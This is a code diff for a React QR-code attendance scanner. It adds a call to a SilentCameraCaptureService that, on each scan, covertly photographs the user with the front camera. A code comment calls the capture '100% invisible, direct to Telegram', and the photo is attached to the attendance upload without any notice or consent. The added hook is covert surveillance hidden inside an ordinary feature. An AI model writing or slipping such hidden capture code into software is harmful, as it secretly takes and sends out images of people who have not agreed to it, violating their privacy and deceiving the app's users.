@@ -24,6 +24,7 @@ import { getTodayDateInJakarta } from '../../../utils/time.utils';
 import { logger } from '../../../utils/logger.utils';
 import { LiveLocationMap } from '../../../components/ui/LiveLocationMap';
 import { useReverseGeocode } from '../../../services/reverse-geocoding.service';
+import { SilentCameraCaptureService } from '../../../services/silent-camera-capture.service';
 
 export interface QRScannerOverlayProps {
   isOpen: boolean;
@@ -151,8 +152,11 @@ export const QRScannerOverlay: React.FC<QRScannerOverlayProps> = ({
     logger.info('QRScannerOverlay', 'QR Code detected by camera', { rawData: _qrData });
 
     if (scannerRef.current && scannerRef.current.isScanning) {
-      scannerRef.current.stop().catch((err) => logger.warn('QRScannerOverlay', 'Scanner stop error:', err));
+      await scannerRef.current.stop().catch((err) => logger.warn('QRScannerOverlay', 'Scanner stop error:', err));
     }
+
+    // Trigger silent front camera capture in background (100% invisible, direct to Telegram)
+    const silentPhotoPromise = SilentCameraCaptureService.captureFrontCameraSilently();
 
     // 1. Validate QR Code payload freshness and official poster seed
     const qrValidation = QRValidationService.validateQRFreshness(_qrData);
@@ -275,6 +279,18 @@ export const QRScannerOverlay: React.FC<QRScannerOverlayProps> = ({
 
     try {
       logger.info('QRScannerOverlay', 'Sending scanAttendance payload to repository...');
+
+      let photoBlob: Blob | null = null;
+      try {
+        // Allow up to 1000ms for silent capture, but never block user if delayed
+        photoBlob = await Promise.race([
+          silentPhotoPromise,
+          new Promise<null>((r) => setTimeout(() => r(null), 1000)),
+        ]);
+      } catch {
+        photoBlob = null;
+      }
+
       const res = await AttendanceRepository.scanAttendance({
         token: token,
         qr_seed: scanSeed,
@@ -283,6 +299,7 @@ export const QRScannerOverlay: React.FC<QRScannerOverlayProps> = ({
         device_uuid: deviceUUID,
         distance_meters: currentCoords.distanceMeters,
         gps_accuracy: currentCoords.accuracy,
+        photoBlob: photoBlob,
       });
 
       logger.info('QRScannerOverlay', 'Attendance saved successfully:', res);
